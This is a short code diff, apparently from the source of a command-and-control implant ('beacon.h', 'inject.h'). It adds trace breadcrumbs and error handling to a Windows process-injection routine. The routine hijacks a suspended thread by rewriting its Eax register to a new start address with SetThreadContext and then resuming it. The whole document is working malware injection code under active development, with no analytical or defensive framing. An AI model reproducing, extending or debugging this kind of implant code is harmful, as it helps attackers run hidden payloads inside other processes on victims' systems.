@@ -5,6 +5,7 @@
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
+#include "x86trace.h"
 
 /*
 * SetThreadContext / ResumeThread
@@ -73,18 +74,29 @@ BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVO
 	 * way screenshot does. Job args still live in the mirrored payload.
 	 */
 	(void)lpParameter;
+	x86_bc("G");
 
 	/* try to query some information about our thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(injctx->hThread, &ctx))
+	if (!GetThreadContext(injctx->hThread, &ctx)) {
+		x86_bc("g");
 		return FALSE;
+	}
 
 	/* update the Eax value to our new start address */
 	ctx.Eax = (DWORD)(DWORD_PTR)lpStartAddress;
-	if (!SetThreadContext(injctx->hThread, &ctx))
+	if (!SetThreadContext(injctx->hThread, &ctx)) {
+		x86_bc("s");
 		return FALSE;
+	}
+	x86_bc("H");
 
 	/* kick off the thread, please */
-	return ResumeThread(injctx->hThread) != -1;
+	if (ResumeThread(injctx->hThread) == (DWORD)-1) {
+		x86_bc("r");
+		return FALSE;
+	}
+	x86_bc("I");
+	return TRUE;
 }
 #endif
